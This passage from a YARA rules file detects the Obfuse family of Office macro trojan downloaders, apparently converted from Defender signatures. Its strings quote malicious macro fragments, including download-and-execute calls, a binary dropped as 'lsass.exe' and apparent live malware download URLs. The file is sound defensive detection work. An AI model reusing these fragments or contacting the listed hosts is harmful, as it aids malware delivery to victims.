        detection_name = "TrojanDownloader:O97M/Obfuse.RV!MTB"
        threat_id = "2147750809"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4e 76 72 65 72 63 20 3d 20 52 65 70 6c 61 63 65 28 ?? ?? ?? ?? ?? ?? 2c 20 22 2e [0-3] 22 2c 20 22 2e 22 20 26 20 ?? ?? ?? ?? ?? ?? 20 26 20 22 6a 73 22 20 26 20 ?? ?? ?? ?? ?? ?? 20 26 20 22 65 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {4e 61 6d 65 20 ?? ?? ?? ?? ?? ?? 20 41 73 20 4e 76 72 65 72 63}  //weight: 1, accuracy: Low
        $x_1_3 = "Gjurv_tr Application.StartupPath, \"\\.\" & \".\\.\" & \".\\..\\\"" ascii //weight: 1
        $x_1_4 = " = \"\" & \"ru\" & \"\" & \"n\"" ascii //weight: 1
        $x_1_5 = {20 26 20 22 73 68 22 20 26 20 ?? ?? ?? ?? ?? ?? 20 26 20 22 65 22 20 26 20 ?? ?? ?? ?? ?? ?? 20 26 20 22 6c 22 20 26 20 22 6c 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SJ_2147750854_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SJ!MTB"
        threat_id = "2147750854"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 68 74 74 70 73 3a 2f 2f [0-37] 2f 6c 73 61 73 73 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_2 = "l = ActiveDocument.Path + \"\\lsass.exe\"" ascii //weight: 1
        $x_1_3 = "= CreateObject(\"Microsoft.XMLHTTP\")" ascii //weight: 1
        $x_1_4 = {4f 70 65 6e 20 22 47 45 54 22 2c 20 [0-5] 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SJ_2147750854_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SJ!MTB"
        threat_id = "2147750854"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox" ascii //weight: 1
        $x_1_2 = "Worksheets(1).Activate" ascii //weight: 1
        $x_1_3 = {3d 20 52 61 6e 67 65 28 [0-2] 29 2e 43 6f 6d 6d 65 6e 74 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 53 74 72 52 65 76 65 72 73 65 28 52 61 6e 67 65 28 [0-2] 29 2e 43 6f 6d 6d 65 6e 74 2e 54 65 78 74 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 45 78 65 63 20 28 53 74 72 52 65 76 65 72 73 65 28 [0-7] 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PE_2147750870_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PE!MSR"
        threat_id = "2147750870"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 [0-32] 68 74 74 70 [0-2] 3a 2f 2f [0-80] 2f 74 72 75 73 74 79 2f [0-48] 2e 70 6e 67 [0-16] 63 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c [0-16] 2e 65 78 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SK_2147750938_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SK!MTB"
        threat_id = "2147750938"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox" ascii //weight: 1
        $x_1_2 = {3d 20 52 61 6e 67 65 28 [0-2] 29 2e 43 6f 6d 6d 65 6e 74 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = "Worksheets(1).Activate" ascii //weight: 1
        $x_1_4 = "= CreateObject(\"winmgmts:Win32_Process\")" ascii //weight: 1
        $x_1_5 = {2e 4d 65 74 68 6f 64 73 5f 28 22 43 72 65 61 74 65 22 29 2e 20 5f [0-16] 49 6e 50 61 72 61 6d 65 74 65 72 73 2e 53 70 61 77 6e 49 6e 73 74 61 6e 63 65 5f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SK_2147750938_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SK!MTB"
        threat_id = "2147750938"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "'MsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBoxMsgBox" ascii //weight: 1
        $x_1_2 = "\"fuck\"" ascii //weight: 1
        $x_1_3 = "\"you\"" ascii //weight: 1
        $x_1_4 = "FieldStr = Split(Tmp, \"///\")" ascii //weight: 1
        $x_1_5 = "= Chr(\"&H\" & Mid(sData, iChar, 2))" ascii //weight: 1
        $x_1_6 = {3d 20 6f 50 72 6f 63 65 73 73 2e 45 78 65 63 4d 65 74 68 6f 64 5f 28 73 48 65 78 44 65 63 6f 64 65 28 22 [0-24] 22 29 2c 20 6f 49 6e 50 61 72 61 6d 73 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LHN_2147750970_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LHN!MTB"
        threat_id = "2147750970"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-21] 22 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_2 = {43 61 6c 6c 20 49 6e 69 74 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = {45 78 69 74 20 53 75 62 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = {53 6f 6c 64 65 72 02 00 45 6e 64 20 53 75 62 02 00 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29}  //weight: 1, accuracy: Low
        $x_1_5 = "GoTo " ascii //weight: 1
        $x_1_6 = "Shell " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LHP_2147751364_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LHP!MTB"
        threat_id = "2147751364"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 72 69 76 61 74 65 20 53 75 62 20 49 6e 69 74 28 29 [0-24] 20 3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-24] 22 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_2 = "Call Init" ascii //weight: 1
        $x_1_3 = "Shell " ascii //weight: 1
        $x_1_4 = "GoTo " ascii //weight: 1
        $x_1_5 = {3d 20 53 74 72 43 6f 6e 76 28 [0-21] 2c 20 [0-2] 29}  //weight: 1, accuracy: Low
        $x_1_6 = {47 6f 54 6f 20 [0-32] 45 78 69 74 20 53 75 62 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LHQ_2147751397_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LHQ!MTB"
        threat_id = "2147751397"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-22] 22 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_2 = {43 61 6c 6c 20 49 6e 69 74 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = {44 69 6d 20 [0-18] 20 41 73 20 4c 6f 6e 67 3a 20 44 69 6d 20 [0-21] 28 29 20 41 73 20 42 79 74 65 [0-24] 20 3d 20 53 74 72 43 6f 6e 76 28 [0-24] 2c 20 [0-3] 29 02 00 47 6f 54 6f 20}  //weight: 1, accuracy: Low
        $x_1_4 = {45 78 69 74 20 53 75 62 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SCG_2147751470_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SCG!MTB"
        threat_id = "2147751470"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Chr(Asc(Mid(ki, gas, 1)) - bb)" ascii //weight: 1
        $x_1_2 = {53 68 65 6c 6c 20 52 65 70 6c 61 63 65 28 73 73 28 22 73 72 [0-45] 76 6b 68 6f 6f 31 68 7b}  //weight: 1, accuracy: Low
        $x_1_3 = ",\"), \" SAOFSOAFSAFSAF \", \"\")" ascii //weight: 1
        $x_1_4 = "ss = ki" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SU_2147751519_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SU!MTB"
        threat_id = "2147751519"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set ages = CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_2 = "ages.ShellExecute (kola)" ascii //weight: 1
        $x_1_3 = "name = \"\\\\\" & name & \".jse" ascii //weight: 1
        $x_1_4 = "= Environ(\"APPDATA\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SU_2147751519_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SU!MTB"
        threat_id = "2147751519"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Set objNetwork = CreateObject(\"WScript.Network\")" ascii //weight: 1
        $x_1_2 = "= \"do shell script \" & Chr$(34) & \"open -a Safari \" & URL & Chr$(34)" ascii //weight: 1
        $x_1_3 = "= ShellExecute(0, \"Open\", URL)" ascii //weight: 1
        $x_1_4 = "= \"do shell script \" & Chr$(34) & \"/usr/bin/curl --url \" & URL & Chr$(34)" ascii //weight: 1
        $x_1_5 = {3d 20 53 68 65 6c 6c 45 78 65 63 75 74 65 28 30 2c 20 76 62 4e 75 6c 6c 53 74 72 69 6e 67 2c 20 22 6e 65 74 22 2c 20 22 75 73 65 [0-10] 22 20 26 20 55 52 4c 2c 20 22 25 77 69 6e 64 69 72 25 5c 73 79 73 74 65 6d 33 32 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SV_2147751521_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SV!MTB"
        threat_id = "2147751521"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 65 74 20 41 20 3d 20 66 73 2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 22 63 3a 5c 53 63 65 6e 65 31 5c 4c 6f 67 53 63 65 6e 65 [0-2] 2e 63 6d 64 22 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_2 = "A.WriteLine (CStr(wmiSeria2.lblFAQscene1.Caption))" ascii //weight: 1
        $x_1_3 = "LoadBytesFunc \"c:\\Scene1\\LogScene1.cmd\", vbNullString, 1, 0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_EO_2147751526_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EO!MTB"
        threat_id = "2147751526"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub DownloadUpdateFileFromSite()" ascii //weight: 1
        $x_1_2 = {6d 79 55 52 4c 20 3d 20 22 [0-5] 3a 2f 2f 77 77 77 2e 65 6d 6f 6a 69 66 6f 72 6f 75 74 6c 6f 6f 6b 2e 63 6f 6d 2f 45 6d 6f 6a 69 2f 56 65 72 73 69 6f 6e 73 2f 22 20 26 20 57 65 62 56 65 72 73 69 6f 6e 4e 61 6d 65}  //weight: 1, accuracy: Low
        $x_1_3 = "WinHttpReq.Open \"GET\", myURL, False" ascii //weight: 1
        $x_1_4 = "oStream.SaveToFile (Environ(\"UserProfile\") & \"\\Downloads\\\" & WebVersionName)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AB_2147751527_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AB!MTB"
        threat_id = "2147751527"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub autoopen()" ascii //weight: 1
        $x_1_2 = ".CreateFolder \"c:\\1\"" ascii //weight: 1
        $x_1_3 = "Benaj.CreateTextFile(\"c:\\1\\SINGAPOUR.cmd\"" ascii //weight: 1
        $x_1_4 = "Benaj.CreateTextFile(\"c:\\1\\FRANCE.cmd\"" ascii //weight: 1
        $x_1_5 = "Architecture.WriteLine (\"break>%FolderVBS%\")" ascii //weight: 1
        $x_1_6 = "(\"start c:\\1\\WomanLove.exe\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AB_2147751527_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AB!MTB"
        threat_id = "2147751527"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Call Shell(marrsell + sdemom & dabsa" ascii //weight: 1
        $x_1_2 = "Str = \"{12}{16}{15}{21}{14}{9}{20}{10}{7}{19}{22}{1}{6}{3}{2}{17}{4}{23}{13}{0}{24}{25}{11}{8}{5}{18};.(UCA{1}" ascii //weight: 1
        $x_1_3 = "Str = sSrt + \"0}([cHAR]85+[cHAR]67+[cHAR]65),[cHAR]34))" ascii //weight: 1
        $x_1_4 = "Function settler()" ascii //weight: 1
        $x_1_5 = "settler = \"CMD.Exe" ascii //weight: 1
        $x_1_6 = "Function commde()" ascii //weight: 1
        $x_1_7 = "Function crsss()" ascii //weight: 1
        $x_1_8 = "AndPlus = settler + doublecheck + formsands + cleardatas + commde + crsss" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RC_2147751528_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RC!MTB"
        threat_id = "2147751528"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {49 66 20 49 73 44 61 74 65 28 [0-10] 29 20 41 6e 64 20 28 28}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 52 65 70 6c 61 63 65 28 [0-10] 2c 20 22 [0-20] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= CreateObject(\"WScript.Shel\" & \"l\")" ascii //weight: 1
        $x_1_4 = "enbmggr.Run" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DE_2147751544_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DE!MTB"
        threat_id = "2147751544"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {6c 75 6c 75 2e 62 72 65 66 75 6c 2e 75 73 2f [0-6] 2f [0-11] 2e 65 78 65 2d 00 68 74 74 70 3a 2f 2f}  //weight: 2, accuracy: Low
        $x_2_2 = {6d 69 2e 63 65 63 65 6c 69 61 6e 73 61 6e 64 65 72 73 2e 75 73 2f [0-6] 2f [0-11] 2e 65 78 65 2d 00 68 74 74 70 3a 2f 2f}  //weight: 2, accuracy: Low
        $x_2_3 = {67 61 6c 69 2e 6b 65 69 70 74 61 2e 75 73 2f [0-18] 2e 65 78 65 2d 00 68 74 74 70 3a 2f 2f}  //weight: 2, accuracy: Low
        $x_1_4 = {25 74 65 6d 70 25 5c [0-40] 2e 65 78 65 27 29 3b 73 74 61 72 74 20 25 74 65 6d 70 25}  //weight: 1, accuracy: Low
        $x_1_5 = "obj.Document.Application.ShellExecute \"cmd.exe \", \"/c \" & \" \"" ascii //weight: 1
        $x_1_6 = {56 42 41 2e 43 6f 6d 6d 61 6e 64 28 [0-10] 2c 20 52 69 67 68 74 28 52 69 67 68 74 28 4d 69 64 28 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            ((3 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_BC_2147751621_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BC!MTB"
        threat_id = "2147751621"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "das = Replace(\"SystemComponentModelTypeDescriptorTypeDescriptorInterfaceshttp://7de3.shandow.ru/Drumheads.exeSystemComponentModelTypeDescriptorTypeDescriptorInterfaces\", \"SystemComponentModelTypeDescriptorTypeDescriptorInterfaces\", \"\")" ascii //weight: 1
        $x_1_2 = "sas = Replace(\"mNetChunkParserReadStateqSystemComponentModelDesignStandardCommandsVSStandardCommandsE.emNetChunkParserReadStateqxe\", \"mNetChunkParserReadStateq\", \"\")" ascii //weight: 1
        $x_1_3 = "lr = CreateProcess(vbNullString, _" ascii //weight: 1
        $x_1_4 = "CmdLine = \"\"\"\" & Filename & \"\"\"\"" ascii //weight: 1
        $x_1_5 = "SystemDataSqlClientSqlColumnEncryptionCspProviderb = lr" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FG_2147751623_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FG!MTB"
        threat_id = "2147751623"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 72 65 61 74 65 46 69 6c 65 57 28 53 74 72 50 74 72 28 22 43 3a 5c 46 4d 4b 53 4a 45 55 5c [0-15] 2e 42 41 54 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {77 73 63 72 69 70 74 20 43 3a 5c 46 4d 4b 53 4a 45 55 5c [0-15] 2e 4a 53 45 22}  //weight: 1, accuracy: Low
        $x_1_3 = "Set docNew = Documents.Add(strTemplateName)" ascii //weight: 1
        $x_1_4 = "docNew.Activate" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MN_2147751624_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MN!MTB"
        threat_id = "2147751624"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-10] 28 22 20 61 57 20 61 53 63 20 61 72 69 20 61 70 74 20 61 22 20 26 20 22 20 61 2e 53 68 20 61 65 6c 20 61 6c 22 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = ".Caption = FiNerty(\"Ru an\")" ascii //weight: 1
        $x_1_3 = "Application.StartupPath & \"\\..\\..\\..\\..\\..\"" ascii //weight: 1
        $x_1_4 = {4d 65 2e 4e 61 6d 65 20 26 20 [0-10] 20 26 20 22 2e 74 78 74 74 78 74 74 78 74 2e 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DB_2147751631_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DB!MTB"
        threat_id = "2147751631"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-192] 22 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_2 = {26 20 43 68 72 28 43 49 6e 74 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-192] 22 29 2e 56 61 6c 75 65 20 26 20 4d 69 64 28 [0-45] 2c 20 [0-45] 2c 20 (30|2d|39) 29 29 20 2d 20 [0-9] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3c 3d 20 4c 65 6e 28 [0-96] 29 20 54 68 65 6e}  //weight: 1, accuracy: Low
        $x_1_4 = "Shell " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PG_2147751740_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PG!MSR"
        threat_id = "2147751740"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "URLDownloadToFileA" ascii //weight: 1
        $x_2_2 = {70 61 79 70 65 74 65 64 2e 63 6f 6d 2f [0-25] 2f [0-6] 2e 65 78 65}  //weight: 2, accuracy: Low
        $x_2_3 = {68 74 74 70 3a 2f 2f 73 75 6c 61 69 6e 75 6c 2e 63 6f 6d 2f [0-25] 2f [0-6] 2e 65 78 65}  //weight: 2, accuracy: Low
        $x_2_4 = {68 74 74 70 3a 2f 2f 76 6f 6e 74 79 2e 62 65 73 74 2f [0-25] 2f [0-6] 2e 65 78 65}  //weight: 2, accuracy: Low
        $x_2_5 = "http://20glorymmausa.com/A/stanzer.exe" ascii //weight: 2
        $x_2_6 = {68 74 74 70 3a 2f 2f 68 69 6e 64 6f 6c 64 2e 63 6f 6d 2f [0-25] 2f [0-6] 2e 65 78 65}  //weight: 2, accuracy: Low
        $x_2_7 = {68 74 74 70 3a 2f 2f 70 75 64 72 6f 74 65 64 2e 63 6f 6d 2f [0-25] 2f [0-6] 2e 65 78 65}  //weight: 2, accuracy: Low
        $x_2_8 = "http://download.sabaloo.com/css/libatk-1.0-0.dat" ascii //weight: 2
